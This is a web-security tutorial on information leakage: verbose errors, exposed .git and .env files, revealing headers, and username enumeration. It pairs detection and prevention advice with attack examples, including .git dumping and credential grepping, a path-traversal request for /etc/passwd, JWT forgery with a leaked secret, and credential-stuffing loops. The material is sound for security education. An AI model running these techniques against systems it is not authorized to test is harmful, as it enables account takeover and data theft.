# Information disclosure vulnerabilities (information leakage)

Information disclosure vulnerabilities occur when websites unintentionally reveal sensitive information to users or attackers. This can range from technical details about infrastructure to user data, credentials, API keys, and business logic. While sometimes low-severity on its own, leaked information often provides the critical piece needed to construct devastating attacks—revealing framework versions with known CVEs, exposing valid usernames for brute-force, or disclosing API endpoints that bypass security controls.

Information disclosure is unique because it's often passive—attackers don't "break in" but rather observe what the application voluntarily reveals through error messages, comments, headers, responses, and configurations.

> Only test systems you own or are explicitly authorized to assess.

## What is information disclosure? (types and impact)

### Categories of leaked information

#### 1) User and business data:
- Usernames, email addresses, phone numbers
- Financial information (credit cards, account balances)
- Personal identifiable information (PII)
- Private messages, documents, communications
- Business-sensitive data (pricing, strategies, partnerships)

#### 2) Technical infrastructure details:
- Software versions (Apache 2.4.1, PHP 7.2.5)
- Framework versions (Django 2.1, Rails 5.2)
- Database types and versions (MySQL 5.7, PostgreSQL 12)
- Operating system details (Ubuntu 18.04, Windows Server 2019)
- Internal IP addresses and network topology
- Directory structures and file paths
- Technology stack details

#### 3) Application internals:
- Source code (via backups, error messages, .git exposure)
- API keys and secrets
- Database credentials
- SQL query structures
- Internal function/method names
- Configuration files
- Development comments in code

#### 4) Security mechanisms:
- Authentication logic details
- Session token formats
- Encryption algorithms used
- API endpoint structures
- Admin panel locations
- Hidden functionality

### Why it matters (impact scenarios)

**Direct impact:**
- Credential theft → Account takeover
- API key exposure → Infrastructure compromise
- PII leakage → Privacy violations, GDPR fines
- Business data exposure → Competitive harm

**Indirect impact (reconnaissance for further attacks):**
- Framework version disclosure → Search for known CVEs
- Username enumeration → Enable brute-force attacks
- Directory structure → Path traversal targeting
- Error messages → SQL injection or code execution
- Valid API endpoints → Business logic bypass

## How information disclosure occurs

### Source 1: Error messages (overly verbose)

**Vulnerable - Stack trace exposure:**
```python
# Python/Django development mode
def process_payment(card_number):
    result = charge_card(card_number)
    return result

# When error occurs:
"""
Traceback (most recent call last):
  File "/var/www/app/payment.py", line 42, in process_payment
    result = charge_card(card_number)
  File "/var/www/app/stripe_api.py", line 15, in charge_card
    api_key = "sk_live_51HxK2jKm..." # Stripe secret key exposed!
    response = requests.post('https://api.stripe.com/v1/charges',
                            auth=(api_key, ''))
ValueError: Invalid card number format
"""
```

**Information leaked:**
- Complete file paths (`/var/www/app/`)
- Source code structure
- API keys in plaintext
- Third-party service details (Stripe)
- Function names and logic flow

**Vulnerable - Database error exposure:**
```sql
Error: You have an error in your SQL syntax near 
'SELECT * FROM users WHERE username = 'admin' AND password = 'test'' at line 1
```

**Information leaked:**
- Database structure (table name: `users`)
- Column names (`username`, `password`)
- SQL query structure (enables SQL injection)

### Source 2: Developer comments

**Vulnerable HTML:**
```html
<html>
<head>
    <title>Login</title>
    <!-- TODO: Remove debug endpoint before deployment -->
    <!-- Debug admin panel: /admin-debug-panel-v2 -->
    <!-- Default creds: admin / temp_password_2024 -->
</head>
<body>
    <!-- API endpoint for mobile app: /api/v2/auth -->
    <!-- Note: v2 API has no rate limiting yet -->
    <form action="/login" method="POST">
        <input name="username">
        <input name="password">
    </form>
</body>
</html>
```

**Information leaked:**
- Hidden admin panel location
- Default credentials
- API endpoint details
- Known vulnerabilities (no rate limiting)

**Vulnerable JavaScript:**
```javascript
// config.js
const API_KEY = "AIzaSyDXxXxXxXxXxXxXxXxXx"; // Google API key
const DB_HOST = "10.0.0.5"; // Internal database server
const DEBUG_MODE = true;

// Authentication logic
function login(username, password) {
    // FIXME: Password validation bypassed if username contains 'admin_'
    if (username.startsWith('admin_')) {
        return true; // Bypass for testing
    }
    
    // Regular authentication
    return authenticate(username, password);
}
```

**Information leaked:**
- API keys
- Internal IP addresses
- Authentication bypass logic
- Security vulnerabilities documented in comments

### Source 3: Backup and temporary files

**Common exposed files:**
```
/.git/                    # Git repository (entire source code)
/.svn/                    # SVN repository
/.env                     # Environment variables (secrets)
/config.php.bak           # Backup configuration file
/database.yml~            # Editor backup file
/.DS_Store                # Mac filesystem metadata
/web.config.old           # Old IIS configuration
/.idea/                   # IDE project files
/composer.json            # PHP dependencies (version info)
/package.json             # Node.js dependencies
```

**Exploitation example:**
```bash
# Download .git repository
wget -r http://target.com/.git/

# Reconstruct source code
git reset --hard

# Now have complete application source code
cat config.php  # Database credentials exposed
```

**Exposed .env file:**
```bash
# http://target.com/.env
DB_HOST=localhost
DB_USER=root
DB_PASSWORD=SuperSecret123!
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
STRIPE_SECRET_KEY=sk_live_51HxK2jKm...
JWT_SECRET=my_jwt_secret_key_12345
```

### Source 4: HTTP headers

**Server version disclosure:**
```http
HTTP/1.1 200 OK
Server: Apache/2.4.18 (Ubuntu)
X-Powered-By: PHP/5.6.30
X-AspNet-Version: 4.0.30319
X-AspNetMvc-Version: 5.2
```

**Information leaked:**
- Web server type and version (Apache 2.4.18 - searchable for CVEs)
- Operating system (Ubuntu)
- Programming language version (PHP 5.6.30 - old, vulnerable)
- Framework versions (ASP.NET MVC 5.2)

**Custom headers revealing internal structure:**
```http
X-Backend-Server: prod-app-server-03
X-Cache-Status: MISS
X-Processing-Time: 0.234
X-User-Role: admin
X-Request-ID: a1b2c3d4-internal-prod
```

**Information leaked:**
- Internal server naming conventions
- Infrastructure details (caching layer)
- User privilege information
- Environment details (prod vs staging)

### Source 5: Robots.txt and sitemap.xml

**Overly revealing robots.txt:**
```
User-agent: *
Disallow: /admin/
Disallow: /admin-backup/
Disallow: /api/internal/
Disallow: /config/
Disallow: /backup/
Disallow: /old-site/
Disallow: /dev/
Disallow: /test/
Disallow: /private/
Disallow: /secret-documents/
```

**Information leaked:**
- Hidden admin panels
- API endpoints
- Backup locations
- Development environments accessible in production

### Source 6: Response timing and behavior differences

**Username enumeration via timing:**
```python
def login(username, password):
    user = get_user(username)
    
    if not user:
        return "Invalid credentials"  # Returns immediately (~5ms)
    
    # Password hashing takes time
    if verify_password(user, password):  # ~100ms for bcrypt
        return "Login successful"
    
    return "Invalid credentials"
```

**Attack:**
```python
import time

for username in username_list:
    start = time.time()
    response = login(username, "wrong_password")
    elapsed = time.time() - start
    
    if elapsed > 0.05:  # More than 50ms
        print(f"Valid username: {username}")
```

**Username enumeration via response differences:**
```python
def forgot_password(email):
    user = get_user_by_email(email)
    
    if not user:
        return "Email not found in our system"  # Leaks info
    
    send_reset_email(user.email)
    return "Password reset email sent"
```

### Source 7: Debug/diagnostic features enabled in production

**PHP info page accessible:**
```
http://target.com/phpinfo.php
```

**Exposes:**
- PHP version and configuration
- All loaded modules
- Environment variables (including secrets)
- File paths
- Database connection details
- Server software versions

**Debug mode enabled:**
```python
# Django settings.py
DEBUG = True  # Should be False in production!

# Now all errors show:
# - Full stack traces
# - Variable values
# - SQL queries
# - File paths
# - Configuration details
```

## Finding information disclosure vulnerabilities

### Technique 1: Forced browsing for common files

**Wordlist of common files:**
```bash
/.git/HEAD
/.git/config
/.env
/.env.backup
/.DS_Store
/config.php
/config.php.bak
/web.config
/web.config.old
/database.yml
/composer.json
/package.json
/phpinfo.php
/info.php
/test.php
/backup/
/old/
/admin/
/api-docs/
/swagger.json
/openapi.json
```

**Automation with ffuf:**
```bash
ffuf -u https://target.com/FUZZ -w common-files.txt -mc 200,301,302
```

### Technique 2: Analyzing error messages

**Test invalid input systematically:**
```http
# SQL errors
GET /user?id=1' HTTP/1.1

# File path errors
GET /download?file=../../../etc/passwd HTTP/1.1

# Type errors
GET /product?id=abc HTTP/1.1

# Missing parameters
GET /api/user HTTP/1.1
(omit required parameters)

# Invalid authentication
GET /admin HTTP/1.1
Authorization: Bearer invalid_token
```

**Look for:**
- Stack traces
- SQL query fragments
- File paths
- Function names
- Framework-specific errors

### Technique 3: Examining HTTP headers and responses

**Check every response for:**
```bash
# Using curl
curl -I https://target.com

# Look for:
Server: Apache/2.4.18
X-Powered-By: PHP/7.2.5
X-AspNet-Version: 4.0.30319
X-Backend-Server: internal-server-01
Set-Cookie: session=eyJhbGc... (decode JWT)
```

**Decode JWT tokens:**
```bash
# JWT in cookie/header
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNjI...

# Decode (jwt.io or command line)
{
  "user_id": 123,
  "role": "admin",  # Reveals privilege system
  "iat": 1616239022,
  "secret": "weak_jwt_secret"  # Sometimes leaked in JWT!
}
```

### Technique 4: Source code review (view-source)

**Check HTML source for:**
- Developer comments
- Hidden form fields with interesting values
- JavaScript files with API keys
- Hardcoded credentials
- API endpoints in AJAX calls
- Disabled input fields (can be enabled)

**Example:**
```html
<input type="hidden" name="role" value="user">
<!-- Change to "admin" for elevated access -->

<script src="/js/config.js"></script>
<!-- Contains API_KEY = "sk_live_..." -->
```

### Technique 5: Testing authentication and access control

**Username enumeration techniques:**

**Different error messages:**
```
Username "admin" → "Incorrect password"
Username "nonexistent" → "Username not found"
```

**Different status codes:**
```
Valid user → 401 Unauthorized
Invalid user → 404 Not Found
```

**Different response times:**
```
Valid user → 150ms (password hashing occurs)
Invalid user → 5ms (immediate return)
```

**Password reset enumeration:**
```
Valid email → "Reset email sent"
Invalid email → "If account exists, reset email will be sent"
                 (but subtle difference in wording or timing)
```

### Technique 6: API endpoint discovery

**Common API documentation paths:**
```
/api-docs
/api/docs
/swagger
/swagger.json
/swagger-ui.html
/api/swagger.json
/v1/api-docs
/v2/api-docs
/openapi.json
/redoc
/graphql (GraphQL introspection enabled)
```

**GraphQL introspection query:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

Reveals entire API structure, all queries, mutations, and types.

### Technique 7: Version disclosure and CVE research

**Identify versions:**
```http
Server: nginx/1.14.0
X-Powered-By: Express 4.16.2
```

**Search for known vulnerabilities:**
```bash
# CVE databases
searchsploit nginx 1.14.0
searchsploit express 4.16

# Or use exploit-db.com, nvd.nist.gov
```

If vulnerable version found, apply public exploit.

## Real-world exploitation examples

### Example 1: .git repository exposure

**Discovery:**
```bash
curl http://target.com/.git/HEAD
# Response: ref: refs/heads/master

# Repository exists!
```

**Exploitation:**
```bash
# Use git-dumper or manual extraction
git-dumper http://target.com/.git ./extracted-repo

cd extracted-repo
git log  # View all commits

# Find sensitive data
grep -r "password" .
grep -r "api_key" .
grep -r "secret" .

# Found in config/database.yml:
# production:
#   adapter: postgresql
#   host: db.internal.company.com
#   username: dbadmin
#   password: P@ssw0rd123!
```

**Impact:** Complete source code + database credentials = full compromise.

### Example 2: Error message SQL injection

**Request:**
```http
GET /product?id=1' HTTP/1.1
```

**Response:**
```
Database Error: You have an error in your SQL syntax near 
'SELECT * FROM products WHERE id = '1'' at line 1

Table: products
Columns: id, name, price, description, stock_quantity
```

**Information gained:**
- SQL injection confirmed
- Table name: `products`
- Column names enumerated
- Can now craft precise injection payloads

### Example 3: phpinfo() exposure

**Discovery:**
```
http://target.com/phpinfo.php → 200 OK
```

**Information exposed:**
```
PHP Version: 7.2.5
Server API: Apache
System: Linux ubuntu 4.15.0-1021-aws
Document Root: /var/www/html
Loaded Extensions: mysqli, pdo_mysql, openssl, curl

Environment Variables:
DB_HOST=localhost
DB_USER=webapp
DB_PASS=MySecretPass123!
AWS_KEY=AKIAIOSFODNN7EXAMPLE
```

**Impact:** Database credentials + AWS keys + system information = infrastructure compromise.

### Example 4: Debug mode revealing JWT secret

**Error in debug mode:**
```python
jwt.exceptions.InvalidSignatureError: Signature verification failed

JWT Header: {"alg":"HS256","typ":"JWT"}
JWT Payload: {"user_id":123,"role":"user"}
Secret used: "my_super_secret_jwt_key_123"

File "/app/auth.py", line 45, in verify_token
    decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
```

**Exploitation:**
```python
import jwt

# Now we know the secret!
SECRET_KEY = "my_super_secret_jwt_key_123"

# Forge admin token
payload = {
    "user_id": 1,
    "role": "admin"  # Escalate privileges
}

forged_token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')

# Use forged token
requests.get('/admin', headers={'Authorization': f'Bearer {forged_token}'})
```

### Example 5: Username enumeration enabling credential stuffing

**Test registration:**
```http
POST /register HTTP/1.1

username=admin&password=test123

Response: "Username 'admin' already taken"
```

**Enumerate valid usernames:**
```python
for username in common_usernames:
    response = register(username, "test")
    if "already taken" in response:
        valid_users.append(username)

# Found: admin, john, sarah, mike
```

**Credential stuffing attack:**
```python
# Use leaked password databases
for user in valid_users:
    for password in leaked_passwords:
        if login(user, password):
            print(f"Compromised: {user}:{password}")
```

## Prevention strategies

### 1) Disable debug features in production

**Bad - Debug enabled:**
```python
# Django settings.py
DEBUG = True
ALLOWED_HOSTS = ['*']
```

**Good - Production configuration:**
```python
# settings.py
import os

DEBUG = os.environ.get('DEBUG', 'False') == 'True'
ALLOWED_HOSTS = ['example.com', 'www.example.com']

# Custom error handlers
HANDLER500 = 'myapp.views.custom_error_handler'
```

### 2) Use generic error messages

**Bad - Verbose errors:**
```python
try:
    user = User.objects.get(username=username)
except User.DoesNotExist:
    return "Username 'admin' does not exist"

if not check_password(password, user.password):
    return "Incorrect password for user 'admin'"
```

**Good - Generic errors:**
```python
try:
    user = User.objects.get(username=username)
    if not check_password(password, user.password):
        raise AuthenticationError()
except (User.DoesNotExist, AuthenticationError):
    return "Invalid username or password"
```

### 3) Remove sensitive headers

**Bad - Verbose headers:**
```python
# Default configuration exposes everything
```

**Good - Minimal headers:**
```python
# nginx.conf
server_tokens off;  # Hide nginx version

# or Apache httpd.conf
ServerTokens Prod
ServerSignature Off

# Application code
response.headers.pop('X-Powered-By', None)
response.headers.pop('Server', None)
```

### 4) Prevent file exposure

**Bad - Exposed sensitive files:**
```
.git/ directory accessible
.env file readable
phpinfo.php exists
```

**Good - Block sensitive paths:**
```nginx
# nginx.conf
location ~ /\. {
    deny all;
}

location ~ \.(bak|old|backup|~|swp)$ {
    deny all;
}

location ~ (phpinfo|info|test)\.php$ {
    deny all;
}
```

### 5) Remove comments before deployment

**Build process:**
```bash
# Webpack/minification removes comments automatically
webpack --mode production

# Or explicitly strip HTML comments
html-minifier --remove-comments input.html -o output.html

# Strip PHP comments
php-stripwhitespace input.php > output.php
```

### 6) Implement consistent response times

**Bad - Timing oracle:**
```python
if user_exists(username):
    if verify_password(password):  # Slow operation
        return success()
```

**Good - Constant time:**
```python
user = get_user(username)

# Always hash, even for non-existent users
if user:
    hash_to_check = user.password_hash
else:
    hash_to_check = DUMMY_HASH  # Dummy value

# Always perform timing-expensive operation
password_valid = constant_time_compare(
    hash_password(password), 
    hash_to_check
)

if user and password_valid:
    return success()
else:
    time.sleep(random.uniform(0.01, 0.02))  # Add jitter
    return "Invalid credentials"
```

### 7) Secure API documentation

**Bad - Public API docs with no auth:**
```
https://api.example.com/docs
→ Full API documentation accessible to anyone
```

**Good - Protected documentation:**
```python
@app.route('/api/docs')
@require_authentication
@require_role('developer')
def api_docs():
    return render_api_documentation()
```

Or disable in production entirely.

## Quick reference

### Common information leakage sources:
```
Error messages - Stack traces, SQL errors, exceptions
HTTP headers - Server, X-Powered-By, version info
Comments - HTML, JavaScript, developer notes
Backup files - .bak, .old, ~, .swp
Source control - .git/, .svn/
Config files - .env, web.config, database.yml
Debug pages - phpinfo.php, /debug, /trace
API docs - /swagger, /api-docs, GraphQL introspection
Response timing - Username enumeration via delays
Response differences - Different messages/status codes
```

### Files to check:
```
/.git/HEAD
/.env
/.DS_Store
/phpinfo.php
/robots.txt
/sitemap.xml
/composer.json
/package.json
/web.config
/config.php
/swagger.json
/.idea/
/backup/
```
